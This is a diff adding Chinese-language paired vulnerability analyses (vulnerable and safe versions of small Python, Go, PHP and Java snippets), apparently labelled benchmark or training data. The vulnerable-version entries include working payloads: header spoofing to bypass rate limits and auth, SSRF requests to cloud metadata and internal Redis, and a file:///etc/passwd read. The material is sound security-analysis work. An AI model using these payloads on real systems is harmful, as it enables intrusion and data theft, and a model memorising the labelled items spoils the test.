@@ -1,0 +1,708 @@
+### wave2-441-01 版本A
+入口: L10 HTTP 头 `X-Forwarded-For`（首段） | 次要: L10 `request.remote_addr`（仅该头缺失时的兜底默认值）
+链: L10 攻击者完全控制 `X-Forwarded-For` 首段并被采信为客户端标识 → L11 `key = "rl:" + client_ip` 限流键随攻击者任意指定 → L16 `if len(hits) > RATE_LIMIT` 频率判定被架空
+防御:
+  L10 `.split(",")[0].strip()` 取首段 → 伪防御: 首段恰是代理链上最外层、客户端可直接注入的值，载荷 `X-Forwarded-For: 8.8.8.8` 即以 `rl:8.8.8.8` 计数，与真实来源完全无关；无任何受信代理判定
+载荷: `for i in $(seq 1 5000); do curl -s -H "X-Forwarded-For: 1.2.3.$((i%250))" http://host/api/search; done` —— 每请求换一个假源，任一键在 60 秒窗口内最多累计 1 次，每分钟 100 次限制永不触发
+组合链: 伪造 XFF 绕过限流 → `before_request` 之后的全部端点失去频率约束 → 可叠加放大撞库/暴力枚举类下游攻击（下游端点与凭据校验在样本外）
+锚句: 非 CWE-770 因存在完整限流逻辑而非无界分配（假键使 L15 `window[key]` 无淘汰增长的次生资源问题并入修复栏前注）；非 CWE-441 因本服务未向内部服务转交请求，缺陷仅是采信了可伪造的转发头
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L10 改为 `client_ip = request.remote_addr`（该取值方式在 L10 兜底分支已存在）；若确需还原真实客户端，应仅在 `remote_addr` 属于已配置受信代理网段时按固定可信跳数从 XFF 右侧取段。另注：L15 `window[key] = hits` 无过期/容量控制，假 IP 可使字典无界增长（CWE-770 次生面），修复键来源后建议同步加键数上限与过期清理
+
+自查清单（441-01）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验其唯一防线（首段截取）为伪防御并给出绕过串
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-01 版本B
+入口: L10 TCP 对端 `request.remote_addr` | 次要: L11 HTTP 头 `X-Forwarded-For`（赋给 `xff_log` 后未再消费）
+链: 未发现可达污点流，原因: 限流键 L12 `key = "rl:" + client_ip` 仅由 L10 `request.remote_addr`（内核按 TCP 连接填充）派生；唯一可注入通道 L11 的 `xff_log` 不参与键构造与 L17 判定，也无日志 sink
+防御:
+  L10 键取 `request.remote_addr` → 有效: 对端地址由 socket 层填充，同一连接内客户端无法伪造；变换键需真实新建连接换源 IP
+  L11 `xff_log = request.headers.get("X-Forwarded-For")` → 有效: 仅赋值不消费，注入任意 XFF 值不影响 L17-L18 的限流行为
+（样本外假设: 若部署于反向代理之后，`remote_addr` 恒为代理地址，全部客户端共享同一配额——属限制过严的可用性问题而非可绕过漏洞，需补反代配置确认）
+载荷: 不适用；持续发送 `X-Forwarded-For: 任意值` 仅累计到 `remote_addr` 对应的同一桶，达到 100 次仍被 L17-L18 以 429 拒绝
+组合链: 无
+锚句: 非 CWE-799 因限流键不可被请求方影响；非 CWE-441 因未采信客户端可控的转发头做任何决策
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；如部署于反代之后，建议在代理层固定写入真实客户端地址并按固定可信跳数解析，避免全站共享配额
+
+自查清单（441-01）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-02 版本A
+入口: L14 HTTP 头 `X-Forwarded-For`（整串） | 次要: L16 `r.RemoteAddr`（仅头为空时兜底）
+链: L14 攻击者控制 XFF 整串并被采信为键 → L19 `hits[ip]++` 以攻击者任意字符串为键递增 → L20 `over := hits[ip] > 600` 限流判定被架空
+防御:
+  L14 `ip := r.Header.Get("X-Forwarded-For")` 优先于对端地址（L15-L16 仅空串兜底） → 伪防御: 头非空即完全取代真实对端，`X-Forwarded-For: x` 单值即成键；`X-Forwarded-For: a, b, c` 以整串成键（逗号/空格差异亦各自成键），攻击者可无限发散键空间
+载荷: `for i in $(seq 1 100000); do curl -s -H "X-Forwarded-For: f$i" http://host/; done` —— 每请求一个新键，单键计数永远到不了 600；同时 10 万个假键写入 `hits`
+组合链: 伪造 XFF 绕过限流 → 同一伪造串直接作 L19 map 键且无淘汰 → `hits` 无界增长致进程内存耗尽（CWE-770 放大，样本内可证）
+锚句: 非 CWE-441 因未发生向内部服务的请求转交，缺陷在键来源被伪造；非 CWE-770 单列因主缺陷是交互频率控制失效，map 膨胀是其可达的放大后果
+结论: 存在漏洞=true | CWE-799 Improper Control of Interaction Frequency | Medium
+修复: L14-L17 删除 XFF 优先逻辑，固定 `ip := r.RemoteAddr`（L16 已有的取值）；L19 建议为 `hits` 增加过期/容量上限。另注：L6 导入的 `"time"` 在本文件无使用点，按 Go 语言规范该文件无法通过编译（imported and not used），需一并删除
+
+自查清单（441-02）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（无有效防御层）
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖包外定义的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-02 版本B
+入口: L14 TCP 对端 `r.RemoteAddr` | 次要: L15 HTTP 头 `X-Forwarded-For`（仅作日志内容）
+链: 未发现可达污点流，原因: 限流键仅由 L14 `r.RemoteAddr` 派生；L15 中 XFF 经 `%q` 转义后进日志，不参与 L17-L18 判定
+防御:
+  L14 `ip := r.RemoteAddr` → 有效: 键由 TCP 栈填充，请求头无法影响；变换键需真实换源连接
+  L15 `auditLog.Printf("xff=%q remote=%s", ...)` → 有效: `%q` 将 XFF 中的换行/引号转义为字面文本，无法借该头注入日志结构（CWE-117 面被封）
+（样本外假设: (a) L15 `auditLog` 在样本内无声明，须由包内其他文件提供定义，否则编译失败，需补该定义；(b) 反代部署下 `remote_addr` 为代理 IP 导致全站共享配额，属过严非漏洞）
+载荷: 不适用；持续发送 `X-Forwarded-For: 任意值` 不改变 `hits` 键空间，600 阈值照常生效
+组合链: 无
+锚句: 非 CWE-117 因 XFF 经 `%q` 转义后才落日志；非 CWE-441 因 XFF 未参与任何信任决策
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；请补 `auditLog` 的同包定义以便复核；另注 L6 `"time"` 导入在本文件无使用点，按 Go 规范无法编译，需删除该导入
+
+自查清单（441-02）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖包外定义的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-03 版本A
+入口: L9 HTTP 头 `X-Internal` | 次要: L12 Cookie `session`（仅存在性检查）
+链: L8 `request.path in INTERNAL_TOOLS` 命中内部工具 → L9 门禁仅比对客户端可注入的头 → `X-Internal: true` 即在 L11 `return` 放行，跳过所有后续检查
+防御:
+  L9 `request.headers.get("X-Internal") != "true"` → 伪防御: 请求头完全由客户端控制且无任何来源佐证，载荷 `X-Internal: true` 逐字通过严格比对
+  L12 `not request.cookies.get("session")` → 伪防御: 仅检查存在性，`Cookie: session=1` 即过该门禁层（`/admin` 的真实授权逻辑在样本外，需补对应路由处理器）
+载荷: `curl -H "X-Internal: true" http://host/metrics` → L20-L22 返回内部指标；对 `/debug/vars` 同理（其后端实现在样本外）
+组合链: 伪造 `X-Internal` → 读取 `INTERNAL_TOOLS` 全部端点（expvar 风格调试端点可泄露运行时状态、内存统计、内部拓扑）→ 为后续内网攻击提供情报
+锚句: 非 CWE-862 因存在显式门禁逻辑，失败点是其凭证可被请求方伪造；非 CWE-639 因不涉及对象级资源标识
+结论: 存在漏洞=true | CWE-290 Authentication Bypass by Spoofing | Medium
+修复: L9 删除基于 `X-Internal` 头的判定，改用代码中已存在的 `request.remote_addr` 与受信网段/回环地址比较（网段判定需引入标准库 `ipaddress`，样本内未导入，需新增）；L12 的存在性检查只能作首层，真实鉴权必须落在路由处理器内
+
+自查清单（441-03）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（两处均给出绕过载荷）
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖样本外路由/授权逻辑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-03 版本B
+入口: L9-L10（`is_internal`）TCP 对端 `request.remote_addr` | 次要: L18 Cookie `session`（仅存在性检查的门禁层）
+链: 未发现可达污点流，原因: L15 `if not is_internal()` 的判定输入仅为 L9 `request.remote_addr`（内核填充）与 L6 硬编码 `TRUSTED_NETS`（`10.0.0.0/8`、`127.0.0.0/8`）的比较；`X-Internal` 头在本版本无读取点
+防御:
+  L9-L10 `ipaddress.ip_address(peer) in TRUSTED_NETS` → 有效: 解析失败抛 `ValueError` 走异常路径（fail-closed），不存在字符串前缀歧义；对端地址不可由请求头/参数影响
+  L18 session 存在性检查 → 有效边界内: 仅决定是否放行到后续层，样本内 `/metrics` 路由（L21-L23）不消费该 cookie
+（样本外假设: (a) "10/8 全网可信"取决于部署——若内网存在攻击者可达宿主或代理覆盖 `remote_addr`，门禁对其放行，需补部署拓扑；(b) `/admin` 的真实鉴权在样本之外）
+载荷: 不适用；公网直连 `curl http://host/metrics` 在 L15-L16 被 403 拒绝
+组合链: 无
+锚句: 非 CWE-290 因判定源 `remote_addr` 不可被请求方伪造；非 CWE-862 因内部工具路径存在显式来源校验
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议将 L6 可信范围从 `10.0.0.0/8` 收窄到实际代理网段，并为 L18 补服务端会话校验（样本外）
+
+自查清单（441-03）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-04 版本A
+入口: L5 HTTP 头 `HTTP_X_FORWARDED_HOST` | 次要: L11 `$_COOKIE['session']`（存在性检查）
+链: L4 `str_starts_with($path, '/internal/')` 命中 → L5 门禁仅比对客户端可注入的 `X-Forwarded-Host` → L6-L8 仅在非 `ops.corp.internal` 时拒绝，伪造该头即放行
+防御:
+  L5 `($_SERVER['HTTP_X_FORWARDED_HOST'] ?? '') === 'ops.corp.internal'` → 伪防御: 该超全局即请求头 `X-Forwarded-Host`，完全由客户端控制，载荷 `X-Forwarded-Host: ops.corp.internal` 逐字通过严格比对，无任何网络位置/签名佐证
+  L11 `empty($_COOKIE['session'])` → 伪防御: `Cookie: session=x` 即过门禁层（`/admin` 实际授权在样本外）
+（样本外假设: L21 `parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)` 与 L4 前缀匹配存在规范化差异空间——如 `/%69nternal/` 不触发 guard 但路由器若解码后路由到 `/internal/` 处理器即可绕过，是否成立取决于路由器解码行为，需补路由定义）
+载荷: `curl -H "X-Forwarded-Host: ops.corp.internal" http://host/internal/config` → L17 `guard($path)` 放行，L19 输出后续内容（`/internal/` 具体后端在样本外）
+组合链: 伪造 `X-Forwarded-Host` → 访问 `/internal/` 全部工具 → 获取内部配置/调试信息（具体暴露面样本外）
+锚句: 非 CWE-862 因存在显式 guard 检查，失败点是凭证可伪造；非 CWE-601 因不涉及 URL 跳转
+结论: 存在漏洞=true | CWE-290 Authentication Bypass by Spoofing | Medium
+修复: L5 删除 `HTTP_X_FORWARDED_HOST` 判定，改用 `$_SERVER['REMOTE_ADDR']` 做来源网段判定（PHP 内置 `filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)` 可用）；L16 建议对 `$path` 先做 `rawurldecode` 再比对，消除规范化差异
+
+自查清单（441-04）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（给出具体绕过头值）
+- [x] 判"安全"已枚举全部入口（HTTP 头、Cookie、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖路由器解码行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-04 版本B
+入口: L5 `$_SERVER['REMOTE_ADDR']`（SAPI 填充的 TCP 对端） | 次要: L12 Cookie `session`
+链: 未发现可达污点流，原因: L5 判定输入 `REMOTE_ADDR` 由服务器填充，`X-Forwarded-Host` 等客户端头在本版本无参与判定的读取点（L6 注明仅作展示）
+防御:
+  L5 `filter_var(REMOTE_ADDR, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false` → 有效: 公网地址校验通过（返回 true，非 false）→ `$isInternal=false` → L7-L9 拒绝；判定源不受请求头影响
+  L12 session 存在性检查 → 仅门禁层放行，实际授权样本外
+（样本外假设: (a) 部署于反代之后时 `REMOTE_ADDR` 为内网代理 IP → `$isInternal=true`，经代理的全部外部流量被放行、门禁失效，需补反代部署；(b) `REMOTE_ADDR` 为空/非法值时 `filter_var` 返回 false 使 `$isInternal=true`（fail-open），SAPI 正常填充下不可达）
+载荷: 不适用；直连发送 `X-Forwarded-Host: ops.corp.internal` 不再影响判定，公网 REMOTE_ADDR 在 L7-L9 被 403 拒绝
+组合链: 无
+锚句: 非 CWE-290 因判定源不可被请求方注入；非 CWE-347 因不涉及签名验证
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议将 fail-open 语义改为显式网段白名单（无效 IP 一律拒绝），反代场景以受信代理列表解析真实来源
+
+自查清单（441-04）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、Cookie、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-05 版本A
+入口: L8 TCP 对端 `request.remote_addr or ""`（唯一判定输入）
+链: 未发现可达污点流，原因: 判定仅消费 L8 `request.remote_addr`（内核按 socket 填充），L9-L10 的前缀剥离与 L11 白名单比对均在服务器侧确定值上进行；无任何 HTTP 头/参数进入判定
+防御:
+  L9-L10 `caller.startswith("::ffff:")` 剥 IPv4-mapped 前缀 → 有效: 仅归一化 `::ffff:127.0.0.1` 类写法，剥离后仍须命中 L4 白名单，未引入非回环等价路径
+  L11 `if caller not in ALLOWED` → 有效: 白名单为字面集合 `{"127.0.0.1", "localhost"}`，非回环地址不可能等于字面值；`::1` 不在集合内被拒（fail-closed，属功能缺口而非漏洞）
+（样本外假设: 部署于本机反代之后时 `remote_addr` 恒为 `127.0.0.1`，门禁对全部经代理请求放行——取决于部署拓扑，需补反代配置；直连场景下防御成立）
+载荷: 不适用；远程直连发送任何头/参数均无法使 L11 判定通过
+组合链: 无
+锚句: 非 CWE-290 因判定源为传输层地址，不可由请求内容伪造；非 CWE-22 因无路径/文件操作
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；功能面建议将 L4 白名单扩为回环网段 `127.0.0.0/8` 与 `::1`（需新增标准库 `ipaddress` 导入），避免 `127.x` 非 .1 地址被误拒
+
+自查清单（441-05）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-05 版本B
+入口: L15 TCP 对端 `request.remote_addr or ""`（唯一判定输入）
+链: 未发现可达污点流，原因: 判定仅消费 L15 `request.remote_addr`；L17 比较对象为 L5 硬编码 `LOOPBACK_NETS`；HTTP 头无参与点
+防御:
+  L7-L11 `normalize()` → 有效: L8 `ipaddress.ip_address(addr)` 解析失败由 L19-L20 捕获 `ValueError` 后 `abort(403)`（fail-closed）；L9-L10 将 `::ffff:127.0.0.1` 类映射地址经 `ip.ipv4_mapped` 归一为 IPv4 再比对，语义正确（非映射时 `ipv4_mapped` 为 None，不替换）
+  L17 `if normalize(caller) not in LOOPBACK_NETS` → 有效: `127.0.0.0/8` 全段与 `::1/128` 精确网段判定，无字符串歧义；空串/非 IP 文本均走异常分支拒绝
+（样本外假设: 本机反代部署下 `remote_addr` 恒为 `127.0.0.1` 时门禁对代理流量全放行，需补部署拓扑）
+载荷: 不适用
+组合链: 无
+锚句: 非 CWE-290 因判定源不可被请求影响；非 CWE-703 因所有异常路径均 fail-closed
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项
+
+自查清单（441-05）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-06 版本A
+入口: L11 TCP 对端 `r.RemoteAddr`（经 `net.SplitHostPort` 解析，唯一判定输入）
+链: 未发现可达污点流，原因: L12 判定仅消费 L11 解析出的 `host`（socket 对端地址字面量）与 L8 硬编码 `loopbackNames` 的比较；无请求头/参数进入判定
+防御:
+  L11 `net.SplitHostPort(r.RemoteAddr)` → 有效: 解析失败（`err != nil`）即拒绝（fail-closed），无结构歧义注入空间
+  L12 `!loopbackNames[host]` → 有效: 白名单为 `127.0.0.1`/`localhost`/`::1` 字面键，对端地址由内核填充不可伪造；IPv4-mapped 写法 `::ffff:127.0.0.1` 不在键内被拒（fail-closed，功能缺口非漏洞）
+（样本外假设: 本机反代部署下 `RemoteAddr` 恒为 `127.0.0.1:port`，门禁对经代理的全部请求放行，需补部署拓扑）
+载荷: 不适用
+组合链: 无
+锚句: 非 CWE-290 因判定源为传输层地址；非 CWE-347 因无签名机制
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；功能面建议改用 `net.ParseIP(host).IsLoopback()` 语义判定（标准库 `net` 已导入），覆盖 mapped 写法
+
+自查清单（441-06）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-06 版本B
+入口: L11 TCP 对端 `r.RemoteAddr`（唯一判定输入）
+链: 未发现可达污点流，原因: L13 判定消费 L12 `net.ParseIP(host)` 的地址语义结果，`host` 来自 L11 `SplitHostPort(r.RemoteAddr)`（内核填充）；无请求头参与
+防御:
+  L12 `net.ParseIP(host)` → 有效: 非法地址文本（`ip == nil`）在 L13 被拒（fail-closed）
+  L13 `!(ip.IsLoopback() || ip.To4() == nil && ip.Unmap().IsLoopback())` → 有效: 按地址语义判定——`127.0.0.1`、`::1`、`::ffff:127.0.0.1` 放行，其余 IPv4/IPv6（含 `fe80::`、公网地址）一律拒绝；`err != nil` 与 `ip == nil` 均短路为拒绝
+（样本外假设: 本机反代部署下 `RemoteAddr` 恒为回环地址，门禁对代理流量全放行，需补部署拓扑）
+载荷: 不适用
+组合链: 无
+锚句: 非 CWE-290 因判定源不可被请求影响；非 CWE-703 因所有失败路径均 fail-closed
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项（L8 `var _ = "defense: ..."` 为无害死代码，可删）
+
+自查清单（441-06）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖部署拓扑的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-07 版本A
+入口: L8 HTTP query 参数 `url`（`request.args.get("url", "")`）
+链: L8 攻击者完全控制 `url` → L12 `requests.get(url, verify=False, timeout=5, ...)` 以本服务网络位置出站且证书校验关闭 → L14 `return upstream.content, 200` 将响应体原样回传攻击者（全读 SSRF）
+防御:
+  L9 `if not url` → 伪防御: 仅拦截空串，`?url=http://127.0.0.1:8080/` 等任意值照常通过；无 scheme/host/IP 任何校验
+  L12 `verify=False` → 伪防御: 证书校验整体禁用（CWE-295），自签/过期/域名不符证书均被接受，内网 HTTPS 服务同样可达
+载荷: `GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/`（云元数据面）；`GET /fetch-avatar?url=http://127.0.0.1:6379/`（内网探测）；响应体经 L14 直接回显
+组合链: SSRF(CWE-918) → L12 `verify=False`(CWE-295) 使内网自签 HTTPS 服务可达 → L14 回显实现内网任意 HTTP(S) 内容读取
+锚句: 非 CWE-441 因缺陷核心是出站目的端完全未校验（918 为更具体定位），本服务仅以自身身份出站；非 CWE-200 因回传的是攻击者指定 URL 的内容而非本服务自身敏感信息
+结论: 存在漏洞=true | CWE-918 Server-Side Request Forgery (SSRF) | High
+修复: L8-L12 增加出站校验：`urllib.parse.urlparse` 后要求 `scheme=="https"` 且 hostname 命中新增白名单常量集合，`socket.getaddrinfo` 解析全部地址排除内网/链路本地网段（标准库 `ipaddress`、`socket` 需新增导入）；L12 `verify=False` 改为 `verify=True`；显式控制重定向目标
+
+自查清单（441-07）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（两处均给出可用载荷）
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖外部环境的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-07 版本B
+入口: L11 HTTP query 参数 `url`
+链: 未发现可达污点流，原因: L12 `urlparse(url)` 后，L13 强制 `u.scheme != "https"` 或 `u.hostname not in AVATAR_ALLOWLIST` 即 L14 返回 400，仅白名单 https URL 才进入 L15 出站
+防御:
+  L13 `if u.scheme != "https" or u.hostname not in AVATAR_ALLOWLIST` → 有效: `urlparse().hostname` 小写化并取 `@` 后主机位，`https://cdn.example.com@evil.com/` 解析出 `evil.com` 被拒；`http://cdn.example.com/` 因 scheme 不符被拒；`https://cdn.example.com.evil.com/` 因主机不等于白名单字面值被拒
+  L15 `requests.get(url, verify=True, ...)` → 有效: 恢复完整证书链与主机名校验，MITM/自签证书不可用
+（样本外假设: (a) L15 未禁用重定向，若 `cdn.example.com` 上存在攻击者可注入 `Location` 的端点（开放重定向）则可中转至内网——样本内不可构造，需补该域行为证据；(b) 白名单域 DNS 解析稳定性，rebinding 需域名控制权，样本外）
+载荷: 不适用；`?url=https://evil.com/` 与 `?url=https://cdn.example.com@evil.com/` 均在 L13 被拒
+组合链: 无
+锚句: 非 CWE-918 因目的端被 scheme+hostname 白名单双重封死；非 CWE-295 因 `verify=True` 恢复校验
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；建议 L15 显式限制重定向跟随以覆盖样本外假设 (a)
+
+自查清单（441-07）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、TCP 对端）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖外部行为的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
+
+### wave2-441-08 版本A
+入口: L10 方法参数 `userUrl`（调用方传入，调用通道样本外） | 次要: L10 参数 `userCaPem`（声明但全函数无使用点，死参数）
+链: L10 `userUrl` 无任何 scheme/host 校验 → L23 `new URL(userUrl)` → L24 `u.openConnection().getInputStream()` 以本进程网络位置与文件系统权限取回内容 → L25 `in.readAllBytes()` 返回调用方
+防御:
+  L13-L14 空 `KeyStore ts` → 伪防御: 载入后从未传入 L21 `ctx.init(null, new TrustManager[]{all}, new SecureRandom())`，是无效摆设
+  L15-L19 匿名 `X509TrustManager` 空实现 → 伪防御: `checkServerTrusted` 为空体，任何证书（自签/过期/域名不符）全部放行，证书校验形同关闭（CWE-295）
+（样本外假设: `fetch()` 的调用方与 `userCaPem` 的预期格式在样本外，需补调用点）
+载荷: `fetch("file:///etc/passwd", null)` → L24 `URL.openConnection()` 对 `file:` 方案返回本地文件流，L25 读出任意文件内容；`fetch("http://169.254.169.254/latest/meta-data/", null)` → 以进程网络位置发起 SSRF
+组合链: `userUrl=file://...` 任意文件读（CWE-22/73 面）或内网 SSRF(CWE-918) → 且 L22 `HttpsURLConnection.setDefaultSSLSocketFactory` 将 trust-all 工厂设为 JVM 全局默认 → 进程内后续所有 HTTPS 连接的证书校验一并被关闭（影响面放大）
+锚句: 非 CWE-295 单列因主 sink 是目的端未校验的取回（918 更具体），禁用校验是其可达性放大器；非 CWE-22 单列因 `file:` 读文件是 URL 方案未受限的子情形，入口仍是 fetch 目的端未校验
+结论: 存在漏洞=true | CWE-918 Server-Side Request Forgery (SSRF) | High
+修复: L23 之前对 `userUrl` 做 scheme 白名单（仅 https）与主机白名单校验（样本内新增常量集合即可）；L22 删除 `setDefaultSSLSocketFactory` 全局污染，改为仅对本次连接 `setSSLSocketFactory(SSLSocketFactory.getDefault())`；删除 L13-L14 死 KeyStore 与 L15-L19 trust-all 实现
+
+自查清单（441-08）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御（两处摆设均给出绕过方式）
+- [x] 判"安全"已枚举全部入口（方法参数）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
